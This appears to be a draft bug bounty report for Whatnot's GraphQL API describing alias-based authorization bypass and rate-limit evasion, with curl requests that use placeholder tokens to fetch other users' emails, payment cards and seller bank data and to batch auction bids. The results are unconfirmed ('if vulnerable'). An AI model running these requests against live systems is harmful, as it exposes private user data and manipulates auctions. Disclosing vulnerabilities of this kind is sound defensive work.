# HackerOne Submission — GraphQL Alias-Based Authorization Bypass (IDOR via Query Aliasing)

**Program:** Whatnot  
**Weakness:** Broken Object Level Authorization / IDOR  
**Severity:** High  
**Asset:** api.whatnot.com  

---

## Summary

GraphQL allows field aliasing — renaming a field in a response using the syntax `alias: fieldName(args)`. Authorization checks may validate the top-level operation or field name but fail to re-validate when the same resolver is invoked under a different alias. This allows an attacker to bypass access control by aliasing a protected query alongside an unprotected one in a single request, or by exploiting inconsistent authorization in aliased multi-fetch patterns.

Additionally, aliasing enables sending the same mutation hundreds of times in one request, bypassing per-mutation rate limits.

---

## Steps to Reproduce

### Step 1 — Baseline: confirm direct access is blocked

```bash
# Direct access to another user's sensitive data - should return 403/null
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ user(id: \"ACCOUNT_B_ID\") { email phone paymentCards { cardType } } }"
  }'
```

Expected: `null` or authorization error.

---

### Step 2 — Alias bypass attempt

Combine the protected query with an unprotected one using aliases:

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query {
      me { id username }
      victimData: user(id: \"ACCOUNT_B_ID\") {
        email
        phone
        paymentCards { cardType billingAddress { line1 zip } }
      }
    }"
  }'
```

---

### Step 3 — Multi-alias IDOR (enumerate multiple users at once)

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query {
      u1: user(id: \"USER_ID_1\") { email paymentCards { cardType } }
      u2: user(id: \"USER_ID_2\") { email paymentCards { cardType } }
      u3: user(id: \"USER_ID_3\") { email paymentCards { cardType } }
      u4: user(id: \"USER_ID_4\") { email paymentCards { cardType } }
      u5: user(id: \"USER_ID_5\") { email paymentCards { cardType } }
    }"
  }'
```

This fetches 5 users' data in 1 request. Even if authorization is present but logged, this reduces detection footprint.

---

### Step 4 — Rate limit bypass via mutation aliasing

```bash
# Place 10 bids simultaneously using aliases - bypasses per-mutation rate limiting
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation {
      bid1: placeBid(auctionId: \"AUCTION_ID\", amount: 50.00) { success currentBid }
      bid2: placeBid(auctionId: \"AUCTION_ID\", amount: 51.00) { success currentBid }
      bid3: placeBid(auctionId: \"AUCTION_ID\", amount: 52.00) { success currentBid }
      bid4: placeBid(auctionId: \"AUCTION_ID\", amount: 53.00) { success currentBid }
      bid5: placeBid(auctionId: \"AUCTION_ID\", amount: 54.00) { success currentBid }
    }"
  }'
```

If each `placeBid` is rate-limited to 1/second but aliasing bypasses this, an attacker can place 10 bids atomically.

---

### Step 5 — Seller-context alias with buyer token

```bash
# Try accessing seller-only fields via alias when authenticated as a buyer
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_BUYER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query {
      publicField: me { username }
      sellerData: me {
        commissionRate
        totalRevenue
        bankAccount { routingNumber lastFour }
        taxDocuments { year url }
      }
    }"
  }'
```

---

## Expected Result

Aliased queries referencing unauthorized resources should return the same error as direct queries:
```json
{"errors": [{"message": "Unauthorized"}]}
```

## Actual Result (if vulnerable)

Aliased fields resolve successfully, returning data that direct queries would deny.

---

## Impact

- IDOR: Access payment cards, email, phone, addresses for arbitrary users
- Enumerate thousands of user profiles in seconds via multi-alias batching
- Bypass per-mutation rate limits to manipulate auctions, spam bids, or brute-force OTPs
- Access seller-privileged data (revenue, bank accounts, tax docs) with buyer tokens

---

## Recommended Fix

- Apply authorization checks at the **resolver level**, not the operation level — aliases re-invoke the resolver so auth must be checked in the resolver itself
- In Absinthe, use `:resolve` middleware that validates `context.current_user.id == args.id` for every invocation
- Enforce per-alias rate limiting (count operations, not HTTP requests)
- Reference: [HackerOne - GraphQL alias auth bypass](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass)
